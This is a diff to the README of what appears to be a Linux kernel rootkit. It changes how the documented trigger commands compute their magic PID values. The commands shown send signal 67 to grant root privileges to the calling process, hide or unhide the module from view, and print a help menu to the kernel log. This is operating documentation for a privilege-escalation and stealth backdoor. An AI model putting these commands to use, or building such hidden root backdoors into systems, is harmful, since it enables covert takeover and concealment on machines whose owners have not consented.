@@ -99,7 +99,7 @@ Commands are triggered by sending this signal with a specific **PID value**.
 ### 1. Get Root
 
 ```bash
-kill -67 0x726f6f74
+kill -67 $(printf "%d" 0x$(printf "root" | xxd -p))
 ```
 
 Grants root privileges (UID/GID = 0) to the calling process.
@@ -109,7 +109,7 @@ Grants root privileges (UID/GID = 0) to the calling process.
 ### 2. Hide / Unhide Module
 
 ```bash
-kill -67 0x68696465
+kill -67 $(printf "%d" 0x$(printf "hide" | xxd -p))
 ```
 
 Toggles visibility of the module from:
@@ -122,7 +122,7 @@ Toggles visibility of the module from:
 ### 3. Show Help Menu (Kernel Log)
 
 ```bash
-kill -67 0x68656c70
+kill -67 $(printf "%d" 0x$(printf "help" | xxd -p))
 ```
 
 Prints a command table to `dmesg`.
@@ -132,7 +132,7 @@ Prints a command table to `dmesg`.
 ## Example
 
 ```bash
-kill -67 0x68656c70
+kill -67 $(printf "%d" 0x$(printf "help" | xxd -p))
 dmesg | tail
 ```
 
